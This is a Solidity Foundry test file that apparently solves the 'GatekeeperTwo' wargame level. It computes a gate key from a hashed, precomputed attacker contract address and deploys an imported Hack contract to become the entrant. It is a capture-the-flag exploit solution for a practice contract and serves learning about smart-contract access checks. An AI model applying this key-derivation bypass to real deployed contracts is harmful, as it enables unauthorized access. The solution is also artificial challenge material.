// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import { GatekeeperTwo } from "./GatekeeperTwo.sol";
import { Hack } from "./GatekeeperTwoHack.sol";

contract GatekeeperTwoTest is Test {
    GatekeeperTwo gatekeeper;

    address h3x0r = vm.addr(1337);

    function setUp() public {
        gatekeeper = new GatekeeperTwo();
    }

    function testGatekeeperTwoCalculations() public {
        unchecked {
            uint64 needToEqual = uint64(0) - 1;
            emit log_uint(uint(needToEqual));

            uint64 addressUint64 = uint64(bytes8(
                keccak256(abi.encodePacked(h3x0r))
            ));
            emit log_uint(uint(addressUint64));

            uint64 raiseTo = needToEqual - addressUint64;
            uint64 addressUint64Raised = addressUint64 ^ uint64(
                raiseTo
            );
            emit log_uint(uint(addressUint64Raised));
        }
    }

    function testGatekeeperTwoHack() public {
        vm.startPrank(h3x0r);
        assertTrue(gatekeeper.entrant() == address(0x0));
        address precomputeHackAddress = computeCreateAddress(
            h3x0r, 0
        );
        uint64 gateKey;
        unchecked {
            uint64 needToEqual = uint64(0) - 1;
            uint64 addressUint64 = uint64(bytes8(
                keccak256(abi.encodePacked(
                    precomputeHackAddress
                ))
            ));
            gateKey = needToEqual - addressUint64;
        }
        Hack hack = new Hack(address(gatekeeper), gateKey);
        emit log_address(gatekeeper.entrant());

        assertTrue(gatekeeper.entrant() != address(0x0));
    }
}
